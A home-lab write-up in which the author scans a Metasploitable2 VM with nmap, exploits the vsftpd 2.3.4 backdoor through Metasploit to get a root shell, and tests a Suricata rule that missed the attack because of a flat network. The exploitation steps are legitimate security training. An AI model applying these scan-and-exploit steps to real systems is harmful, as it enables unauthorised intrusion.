# Metasploitable Exploitation and Detection Analysis

## Overview

In this lab, I simulated a real attack scenario against a vulnerable system (Metasploitable2) using Kali Linux. The goal was not just to exploit the system, but to understand how vulnerabilities are identified, how exploits are chosen, and whether the attack can be detected using a network-based IDS (OPNsense with Suricata).

This lab also highlights an important concept in security: even when detection tools are present, attacks can still go unnoticed if the network is not designed correctly.

## Lab Setup

The environment consisted of four main components:

- Kali Linux (attacker)
- Metasploitable2 (target)
- OPNsense (firewall + IDS)
- Wazuh (SIEM, not used in this specific attack)

All machines were placed on the same internal network.

## Reconnaissance (Nmap Scan)

The first step was to gather information about the target system using Nmap.

Command used:

```bash
nmap -A -Pn --top-ports 500 10.200.200.50
```

Full scan output:

```
┌──(hamza㉿hamza)-[~]
└─$ nmap -A -Pn --top-ports 500  10.200.200.50
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-29 06:28 EDT
Nmap scan report for 10.200.200.50
Host is up (0.00019s latency).
Not shown: 479 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.200.200.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
|_ssl-date: 2026-04-29T10:28:34+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      35178/udp   mountd
|   100005  1,2,3      50827/tcp   mountd
|   100021  1,3,4      44229/udp   nlockmgr
|   100021  1,3,4      57341/tcp   nlockmgr
|   100024  1          46164/udp   status
|_  100024  1          53392/tcp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 8
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SwitchToSSLAfterHandshake, ConnectWithDatabase, Speaks41ProtocolNew, LongColumnFlag, SupportsCompression, SupportsTransactions
|   Status: Autocommit
|_  Salt: ;?m({TrcuGAOH[qHTJXZ
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2026-04-29T10:28:34+00:00; +2s from scanner time.
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 0:07:11
|   source ident: nmap
|   source host: EE222FAC.CCDC84E.4532DF55.IP
|_  error: Closing Link: wbtqdcoim[10.200.200.10] (Quit: wbtqdcoim)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
MAC Address: 08:00:27:D1:60:48 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2026-04-29T06:28:25-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 1h00m01s, deviation: 2h00m00s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE
HOP RTT     ADDRESS
1   0.19 ms 10.200.200.50

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.80 seconds
                                                                  
```

This scan provided detailed information about open ports, running services, and versions.

## What Was Discovered

The scan revealed that the system was running multiple outdated and exposed services. This is important because attackers do not just look for open ports — they look for specific versions that are known to be vulnerable.

Some key findings:

- FTP running vsftpd 2.3.4 with anonymous login enabled
- Samba services exposed on ports 139 and 445
- Telnet service available (insecure by design)
- UnrealIRCd running on port 6667
- Apache web server running an outdated version

At this stage, the goal is not to attack everything, but to identify the most reliable and well-known vulnerability.

## Choosing What to Exploit

The FTP service stood out immediately:

- It was running vsftpd 2.3.4
- This version is known to contain a backdoor
- It allows direct remote access without authentication

Instead of randomly trying attacks, this is a case of matching a known vulnerability to a known exploit. This is how real attackers operate.

## Exploitation with Metasploit

Metasploit was used to exploit the FTP vulnerability.

First, Metasploit was launched:

```bash
msfconsole
```

Then the exploit was searched:

```bash
search vsftpd
```

![Metasploit Search](./ msfconsole1.PNG)

The correct module was selected and configured:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 10.200.200.50
run
```

![Exploit Execution](./RCE.PNG)

## What Happened During the Exploit

The exploit did not “log in” normally. Instead, it triggered a hidden backdoor in the FTP service.

Behind the scenes:

- A specially crafted login request is sent to the FTP server
- The backdoor is triggered silently
- The target opens a shell on port 6200
- Metasploit connects to that shell

This results in a command shell being opened on the target system.

## Result of the Attack

The exploit was successful and provided root-level access to the system.

This means:

- Full control over the machine was achieved
- No authentication was required
- The system was completely compromised

This is an example of a Remote Code Execution (RCE) vulnerability.

## Attempting Detection with Suricata

To detect this behavior, a custom Suricata rule was created:

```
alert tcp any any -> any 6200 (msg:"VSFTPD BACKDOOR SHELL DETECTED"; sid:3000001; rev:1;)
```

The idea behind this rule is simple:

Port 6200 is not normally used, so any connection to it is highly suspicious and likely tied to the backdoor.

## Detection Outcome

When the exploit was executed, no alerts were generated.

However, when manually scanning the firewall using:

```bash
nmap -p 6200 10.200.200.254
```

The alert was triggered successfully.

This confirms that:
- The rule works
- Suricata is functioning correctly

## Why the Exploit Was Not Detected

The issue was not with the rule, but with the network design.

Both Kali and Metasploitable were on the same subnet. This means:

- Traffic flowed directly between the two machines
- The firewall was bypassed completely
- Suricata never saw the exploit traffic

In other words, the IDS was in place, but the traffic never reached it.

## Key Takeaway

Detection is not just about having rules — it depends on where traffic flows.

If traffic does not pass through the inspection point, it cannot be detected.

This lab clearly demonstrates how poor network segmentation can create blind spots, allowing attackers to operate without being seen.

## Lessons Learned

This exercise showed that identifying vulnerabilities is only part of the process. Understanding how systems communicate is just as important.

It also highlighted that:

- Real attacks are based on known vulnerabilities, not random attempts
- Detection tools require proper placement to be effective
- Flat networks make lateral movement easier and harder to detect
- A successful exploit does not always generate alerts

## Next Steps

To improve this lab further, the next steps would be:

- Reconfigure the network so all traffic passes through OPNsense
- Install a Wazuh agent on Metasploitable to monitor host activity
- Perform additional exploits such as Samba and UnrealIRCd
- Compare detection before and after improving visibility

This would allow the lab to demonstrate both offensive and defensive capabilities more clearly.
